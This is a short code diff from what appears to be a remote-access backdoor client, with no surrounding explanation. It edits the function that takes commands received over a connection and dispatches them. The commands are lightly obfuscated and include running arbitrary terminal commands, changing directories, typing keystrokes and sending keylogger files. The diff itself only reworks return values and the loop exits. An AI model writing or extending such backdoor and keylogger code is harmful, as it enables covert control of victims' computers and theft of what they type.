@@ -321,15 +321,17 @@ def sendFileKeylogger():
 
 def execute(data):
     global run, sortir, ossys, reloading, sendListenKeylogger
+    if not data:
+        return False, False
     data = data.replace("9", "")
     data = data.replace("1+8", "9")
     dataLoop = data.split("{-_-}")
     for data in dataLoop:
+        if not data:
+            break
         datalist = data.split()
-        if not datalist:
-            return None
         if data == "die":
-            return None
+            return False, False
         elif data[0:2] == "cd":
             cdAccess(data[3:len(data)])
         elif data[0:6] == "write(":
@@ -350,7 +352,7 @@ def execute(data):
             t.start()
         elif data == "left":
             print("restart")
-            return None
+            return True, False
         elif data[0:4] == "fast":
             scripter.speed_write(data[5:len(data)])
         elif data == "test":
@@ -373,6 +375,7 @@ def execute(data):
             sendFileKeylogger()
         else:
             terminal(data)
+    return True, True
 
 run, progrun = True, True
 timeoutKill = 20
@@ -445,8 +448,8 @@ while True:
         pass
     if run:
         while True:
-            execute(receive(timeoutKill))
-            if run == False:
+            progrun, run = execute(receive(timeoutKill))
+            if not run or not progrun:
                 break
         if not progrun:
             break
